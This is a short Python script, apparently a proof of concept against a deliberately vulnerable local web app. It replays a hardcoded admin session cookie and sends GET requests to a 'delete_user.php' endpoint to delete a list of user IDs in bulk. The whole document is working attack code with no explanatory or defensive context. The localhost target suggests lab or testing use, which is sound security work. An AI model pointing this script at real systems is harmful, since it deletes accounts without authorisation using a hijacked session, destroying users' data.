import requests

# URL of the vulnerable delete_user.php script
url = "http://localhost/vulnerable-web/delete_user.php"

# List of user IDs to delete (for example purposes)
user_ids_to_delete = [11,12,13,14]

# Session cookies for an authenticated admin user
cookies = {
    'PHPSESSID': 'ggafa1gi2irh62pm54ab4tgkj7'
}

# Function to send the delete request
def delete_user(user_id):
    params = {'id': user_id}
    response = requests.get(url, params=params, cookies=cookies)
    if "User deleted successfully" in response.text:
        print(f"User ID {user_id} deleted successfully.")
    else:
        print(f"Failed to delete User ID {user_id}.")

# Loop through user IDs and attempt to delete them
for user_id in user_ids_to_delete:
    delete_user(user_id)
